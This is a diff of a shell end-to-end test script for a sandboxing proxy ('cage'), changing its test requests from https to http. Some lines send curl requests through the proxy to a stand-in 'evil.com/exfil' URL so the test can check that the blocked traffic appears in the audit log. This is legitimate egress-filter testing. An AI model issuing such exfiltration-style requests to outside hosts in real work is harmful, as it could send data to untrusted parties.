@@ -16,8 +16,8 @@ if ! curl -sf "$BASE/" >/dev/null 2>&1; then
   create_cage "$REPO_ROOT/examples/basic/cage.yaml" >/dev/null
   wait_ready "$BASE" 120 || { e2e_fail "2.0" "Setup" "cage not ready"; print_results; exit 1; }
   # Generate some traffic
-  curl -s "$BASE/fetch?url=https://httpbin.org/get" >/dev/null 2>&1 || true
-  curl -s "$BASE/fetch?url=https://evil.com/exfil" >/dev/null 2>&1 || true
+  curl -s "$BASE/fetch?url=http://httpbin.org/get" >/dev/null 2>&1 || true
+  curl -s "$BASE/fetch?url=http://evil.com/exfil" >/dev/null 2>&1 || true
   # Poll until audit log contains the expected entry (up to 10s)
   _audit_deadline=$((SECONDS + 10))
   while [ "$SECONDS" -lt "$_audit_deadline" ]; do
@@ -28,7 +28,7 @@ if ! curl -sf "$BASE/" >/dev/null 2>&1; then
   done
 else
   # Ensure we have blocked traffic for audit tests
-  curl -s "$BASE/fetch?url=https://evil.com/exfil" >/dev/null 2>&1 || true
+  curl -s "$BASE/fetch?url=http://evil.com/exfil" >/dev/null 2>&1 || true
   # Poll until audit log contains the blocked entry (up to 10s)
   _audit_deadline=$((SECONDS + 10))
   while [ "$SECONDS" -lt "$_audit_deadline" ]; do
@@ -75,7 +75,7 @@ export E2E_PORT_HAR="$HAR_PORT"
 create_cage "$CONFIGS/har.yaml" >/dev/null
 if wait_ready "$HAR_BASE" 120; then
   # Generate traffic
-  curl -s "$HAR_BASE/fetch?url=https://httpbin.org/get" >/dev/null 2>&1 || true
+  curl -s "$HAR_BASE/fetch?url=http://httpbin.org/get" >/dev/null 2>&1 || true
   # Poll until HAR data is available (up to 15s)
   _har_deadline=$((SECONDS + 15))
   _har_ready=false
